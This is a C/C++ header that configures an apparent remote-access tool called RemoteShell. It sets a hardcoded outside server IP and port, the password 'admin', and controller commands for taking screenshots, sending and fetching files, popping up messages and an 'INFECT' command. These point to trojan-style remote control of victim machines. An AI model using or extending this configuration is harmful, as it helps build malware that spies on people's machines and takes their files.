#pragma once
//////////////////////////////////////////////////////////////////////////////////////
//						RemoteShell Configuration file								//
//		 Setup		 "RemoteShell Client" & "RemoteShell Server" at here			//
//////////////////////////////////////////////////////////////////////////////////////

/*				Server					*/

#define      REMOTESHELL_SERVER_IPADDR   "112.74.110.245"
#define      REMOTESHELL_SERVER_PORT	   7613

// #define      REMOTESHELL_SERVER_IPADDR   "127.0.0.1"
// #define      REMOTESHELL_SERVER_PORT	   7613

#define      REMOTESHELL_SERVER_PASSWORD  "admin"


/*				Client					*/
#define      REMOTESHELL_CLIENT_PORT	   7614


/*			    Controller				*/
#define      REMOTESHELL_CONTROLLER_PORT   7615


/*				Others				    */
#define     REMOTESHELL_LIVE_TIME           5000


/*				Controller Commands      */
#define     REMOTESHELL_CCMD_LIST           "list"
#define     REMOTESHELL_CCMD_CONNECT        "connect"
#define     REMOTESHELL_CCMD_LOGIN	        "login"
#define     REMOTESHELL_CCMD_QUIT			"quit"	
#define     REMOTESHELL_CCMD_SCREENSHOT		"SCREENSHOT "
#define     REMOTESHELL_CCMD_SENDFILE		"SENDFILE "
#define     REMOTESHELL_CCMD_GETFILE		"GETFILE "
#define     REMOTESHELL_CCMD_MSGBOX			"MSG "	
#define     REMOTESHELL_CCMD_INFECT			"INFECT "

#define     GRAMMAR_TOKEN_CMDLIST           1
#define     GRAMMAR_TOKEN_CONNECT           2
#define     GRAMMAR_TOKEN_NUMBER            3
#define     GRAMMAR_TOKEN_IPADDR            4
#define     GRAMMAR_TOKEN_LOGIN             5